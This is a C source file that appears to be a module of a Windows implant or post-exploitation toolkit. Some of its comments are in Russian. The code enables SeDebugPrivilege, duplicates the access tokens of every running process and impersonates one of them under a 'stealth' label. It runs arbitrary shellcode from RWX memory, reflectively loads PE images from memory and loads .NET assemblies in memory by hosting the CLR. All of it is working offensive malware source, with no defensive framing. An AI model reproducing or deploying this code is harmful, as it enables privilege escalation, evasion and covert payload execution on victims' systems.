 #define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include "user.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <oleauto.h>  
#include <tchar.h>   
#include <metahost.h> 

#include <guiddef.h>
typedef interface _AppDomain _AppDomain;
EXTERN_C const IID IID__AppDomain =
{ 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x5A, 0xA1, 0x0E, 0x5F, 0xF7 } };

typedef interface _Assembly _Assembly;
EXTERN_C const IID IID__Assembly =
{ 0x1715637A, 0x8F1E, 0x3A45, { 0x9A, 0x6C, 0x7E, 0xC5, 0x2D, 0xFD, 0x5D, 0x55 } };

typedef struct _AppDomain _AppDomain;
typedef struct _AppDomainVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(_AppDomain *This, REFIID riid, void **ppvObject);
    ULONG   (STDMETHODCALLTYPE *AddRef)      (_AppDomain *This);
    ULONG   (STDMETHODCALLTYPE *Release)     (_AppDomain *This);
    HRESULT (STDMETHODCALLTYPE *Load_3)(_AppDomain *This, SAFEARRAY *pbArray, _Assembly **pAssembly);
} _AppDomainVtbl;
struct _AppDomain {
    const _AppDomainVtbl *lpVtbl;
};

// v-table _Assembly
typedef struct _Assembly _Assembly;
typedef struct _AssemblyVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(_Assembly *This, REFIID riid, void **ppvObject);
    ULONG   (STDMETHODCALLTYPE *AddRef)      (_Assembly *This);
    ULONG   (STDMETHODCALLTYPE *Release)     (_Assembly *This);
} _AssemblyVtbl;
struct _Assembly {
    const _AssemblyVtbl *lpVtbl;
};

#include "MemoryModule.h"
// #ifndef MemoryCallDllMain
// #define MemoryCallDllMain MemoryCallEntry
// #endif
#include <mscoree.h> 
#pragma comment(lib, "mscoree.lib")

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "oleaut32.lib")

// Token-stealth  structures
typedef struct _USER_TOKEN {
    HANDLE hToken;
    DWORD  pid;
} USER_TOKEN;

typedef struct _USER_TOKEN_LIST {
    USER_TOKEN *tokens;
    size_t      count;
} USER_TOKEN_LIST;

static USER_TOKEN_LIST g_TokenList = { NULL, 0 };
static bool            g_IsStealth  = false;
static HANDLE          g_hOrigToken = NULL;

static bool EnableDebugPrivilege(void) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken = NULL;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[ERROR] LookupPrivilegeValue failed: %lu\n", GetLastError());
        return false;
    }
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken)) {
        printf("[ERROR] OpenProcessToken failed: %lu\n", GetLastError());
        return false;
    }
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) ||
         GetLastError() != ERROR_SUCCESS) {
        printf("[ERROR] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }
    CloseHandle(hToken);
    printf("[DEBUG] SeDebugPrivilege enabled\n");
    return true;
}

// Сбор - Дубль всех токенов
static bool CollectAllTokens(USER_TOKEN_LIST *out) {
    if (!EnableDebugPrivilege())
        return false;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[ERROR] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return false;
    }

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (!Process32First(hSnap, &pe)) {
        printf("[ERROR] Process32First failed: %lu\n", GetLastError());
        CloseHandle(hSnap);
        return false;
    }

    USER_TOKEN *arr = NULL;
    size_t cap = 0, cnt = 0;
    do {
        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!hProc) continue;

        HANDLE hTok;
        if (OpenProcessToken(hProc,
                             TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                             &hTok)) {
            HANDLE hDup;
            if (DuplicateTokenEx(hTok,
                                 TOKEN_ALL_ACCESS,
                                 NULL,
                                 SecurityImpersonation,
                                 TokenImpersonation,
                                 &hDup)) {
                if (cnt >= cap) {
                    size_t newCap = cap ? cap * 2 : 16;
                    USER_TOKEN *tmp = (USER_TOKEN*)realloc(arr, newCap * sizeof(*tmp));
                    if (!tmp) {
                        printf("[ERROR] realloc failed\n");
                        CloseHandle(hDup);
                        CloseHandle(hTok);
                        CloseHandle(hProc);
                        break;
                    }
                    arr = tmp;
                    cap = newCap;
                }
                arr[cnt].hToken = hDup;
                arr[cnt].pid    = pe.th32ProcessID;
                cnt++;
            }
            CloseHandle(hTok);
        }
        CloseHandle(hProc);
    } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);

    if (cnt == 0) {
        free(arr);
        printf("[ERROR] No tokens collected\n");
        return false;
    }
    out->tokens = arr;
    out->count  = cnt;
    printf("[DEBUG] Collected %zu tokens\n", cnt);
    return true;
}

// Тащим текущий токен
static void SaveOriginalToken(void) {
    if (g_hOrigToken == NULL) {
        if (!OpenThreadToken(GetCurrentThread(),
                             TOKEN_ALL_ACCESS,
                             TRUE,
                             &g_hOrigToken)) {
            g_hOrigToken = NULL;
        }
    }
}

// Token Stealth
bool User_StealthStart(void) {
    if (g_IsStealth) {
        printf("[WARN] Stealth already active\n");
        return true;
    }

    if (!CollectAllTokens(&g_TokenList))
        return false;

    SaveOriginalToken();

    if (!ImpersonateLoggedOnUser(g_TokenList.tokens[0].hToken)) {
        printf("[ERROR] ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
        for (size_t i = 0; i < g_TokenList.count; i++)
            CloseHandle(g_TokenList.tokens[i].hToken);
        free(g_TokenList.tokens);
        g_TokenList.tokens = NULL;
        g_TokenList.count  = 0;
        return false;
    }
    printf("[DEBUG] Impersonated PID %u\n", g_TokenList.tokens[0].pid);
    g_IsStealth = true;
    return true;
}

void User_StealthStop(void) {
    if (!g_IsStealth) {
        printf("[WARN] Stealth not active\n");
        return;
    }

    RevertToSelf();
    if (g_hOrigToken) {
        ImpersonateLoggedOnUser(g_hOrigToken);
        CloseHandle(g_hOrigToken);
        g_hOrigToken = NULL;
    }
    printf("[DEBUG] Reverted to original security context\n");

    for (size_t i = 0; i < g_TokenList.count; i++)
        CloseHandle(g_TokenList.tokens[i].hToken);
    free(g_TokenList.tokens);
    g_TokenList.tokens = NULL;
    g_TokenList.count  = 0;
    g_IsStealth = false;
    printf("[DEBUG] Token list freed\n");
}

// RWX shellcode
bool User_ExecuteShellcode(const uint8_t *shellcode, size_t length) {
    if (!shellcode || length == 0) {
        printf("[ERROR] Invalid shellcode parameters\n");
        return false;
    }
    void *mem = VirtualAlloc(NULL, length,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[ERROR] VirtualAlloc failed: %lu\n", GetLastError());
        return false;
    }
    memcpy(mem, shellcode, length);
    HANDLE h = CreateThread(NULL, 0,
                            (LPTHREAD_START_ROUTINE)mem,
                            NULL, 0, NULL);
    if (!h) {
        printf("[ERROR] CreateThread failed: %lu\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return false;
    }
    printf("[DEBUG] Shellcode thread started at %p\n", mem);
    CloseHandle(h);
    return true;
}

// Reflective PE loader
bool User_ReflectiveLoadPE(const uint8_t *pe_bytes, size_t pe_size) {
    if (!pe_bytes || pe_size < sizeof(IMAGE_DOS_HEADER)) {
        printf("[ERROR] Invalid PE buffer\n");
        return false;
    }
    HMEMORYMODULE mod = MemoryLoadLibrary(pe_bytes, pe_size);
    if (!mod) {
        printf("[ERROR] MemoryLoadLibrary failed: %lu\n", GetLastError());
        return false;
    }
     if (MemoryCallEntryPoint(mod) < 0) {
        printf("[ERROR] DLL entry point failed\n");
        MemoryFreeLibrary(mod);
        return false;
    }
    printf("[DEBUG] Reflective PE loaded at %p\n", (void*)mod);
    // mod
    return true;
}

// .NET loader
bool User_ReflectiveLoadDotNet(const uint8_t *assembly_bytes, size_t assembly_size) {
    if (!assembly_bytes || assembly_size == 0) {
        printf("[ERROR] Invalid .NET assembly buffer\n");
        return false;
    }

    HRESULT hr;
    ICLRMetaHost    *pMetaHost       = NULL;
    ICLRRuntimeInfo *pRuntimeInfo    = NULL;
    ICorRuntimeHost *pHost           = NULL;   
    IUnknown        *pAppDomainThunk = NULL;
    _AppDomain      *pDefaultDomain  = NULL;
    _Assembly       *pAssembly       = NULL;
    SAFEARRAY       *sa              = NULL;

    // ICLRMetaHost
    hr = CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        printf("[ERROR] CLRCreateInstance failed: 0x%08X\n", hr);
        goto cleanup;
    }

    // ICLRRuntimeInfo
    hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost,
        L"v4.0.30319", &IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) {
        printf("[ERROR] GetRuntime failed: 0x%08X\n", hr);
        goto cleanup;
    }

    // ICorRuntimeHost
    hr = pRuntimeInfo->lpVtbl->GetInterface(
        pRuntimeInfo,
        &CLSID_CorRuntimeHost,
        &IID_ICorRuntimeHost,
        (LPVOID*)&pHost
    );
    if (FAILED(hr)) {
        printf("[ERROR] GetInterface ICorRuntimeHost failed: 0x%08X\n", hr);
        goto cleanup;
    }

    hr = pHost->lpVtbl->Start(pHost);
    if (FAILED(hr)) {
        printf("[ERROR] CLR Start failed: 0x%08X\n", hr);
        goto cleanup;
    }

    // default AppDomain
    hr = pHost->lpVtbl->GetDefaultDomain(pHost, &pAppDomainThunk);
    if (FAILED(hr)) {
        printf("[ERROR] GetDefaultDomain failed: 0x%08X\n", hr);
        goto cleanup;
    }

    hr = pAppDomainThunk->lpVtbl->QueryInterface(
        pAppDomainThunk,
        &IID__AppDomain,
        (void**)&pDefaultDomain
    );
    if (FAILED(hr)) {
        printf("[ERROR] QueryInterface _AppDomain failed: 0x%08X\n", hr);
        goto cleanup;
    }

    // SAFEARRAY
    sa = SafeArrayCreateVector(VT_UI1, 0, (ULONG)assembly_size);
    if (!sa) {
        printf("[ERROR] SafeArrayCreateVector failed\n");
        goto cleanup;
    }
    {
        void *pv = NULL;
        SafeArrayAccessData(sa, &pv);
        memcpy(pv, assembly_bytes, assembly_size);
        SafeArrayUnaccessData(sa);
    }

    // Подгружает сборку
    hr = pDefaultDomain->lpVtbl->Load_3(pDefaultDomain, sa, &pAssembly);
    if (FAILED(hr) || !pAssembly) {
        printf("[ERROR] Load_3 failed: 0x%08X\n", hr);
        goto cleanup;
    }
    printf("[DEBUG] .NET assembly loaded reflectively\n");

cleanup:
    if (sa)             SafeArrayDestroy(sa);
    if (pAssembly)      pAssembly->lpVtbl->Release(pAssembly);
    if (pDefaultDomain) pDefaultDomain->lpVtbl->Release(pDefaultDomain);
    if (pAppDomainThunk) pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    if (pHost)           pHost->lpVtbl->Release(pHost);
    if (pRuntimeInfo)    pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
    if (pMetaHost)       pMetaHost->lpVtbl->Release(pMetaHost);

    return SUCCEEDED(hr);
}

bool User_ExecuteReflectiveShellcode(const uint8_t *payload, size_t size) {
    if (!payload || size < sizeof(IMAGE_DOS_HEADER)) {
        printf("[ERROR] Invalid payload for reflective shellcode loader\n");
        return false;
    }
    HMEMORYMODULE mod = MemoryLoadLibrary(payload, size);
    if (!mod) {
        printf("[ERROR] MemoryLoadLibrary failed: %lu\n", GetLastError());
        return false;
    }
    if (MemoryCallEntryPoint(mod) < 0) {
        printf("[ERROR] Reflective shellcode entry point failed\n");
        MemoryFreeLibrary(mod);
        return false;
    }
    printf("[DEBUG] Reflective shellcode loaded at %p\n", (void*)mod);
    return true;
}
